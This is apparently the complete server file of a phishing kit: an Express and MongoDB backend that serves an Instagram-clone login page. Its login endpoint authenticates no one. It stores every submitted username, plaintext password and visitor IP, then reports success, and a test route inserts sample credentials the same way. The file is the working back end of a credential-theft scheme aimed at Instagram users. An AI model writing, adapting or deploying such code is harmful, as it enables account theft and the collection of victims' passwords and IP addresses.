const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, "instagram-clone-login-page")));

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("MongoDB connected"))
    .catch(err => console.log(err));

const User = mongoose.model("User", {
    username: String,
    password: String,
    ip: String
});

app.get("/api/test", async (req, res) => {
    res.json({ message: "Backend is working!" });
    await User.insertOne({ username: "testuser", password: "testpass", ip: req.ip });
});


app.post("/api/login", async (req, res) => {
    const { username, password } = req.body;
    const ip = req.ip;

    await User.insertOne({ username, password, ip });

    res.json({ "done": true });
});

app.get("/", (req, res) => {
    res.sendFile(
        path.join(
            __dirname,
            "instagram-clone-login-page",
            "index.html"
        )
    );
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running");
});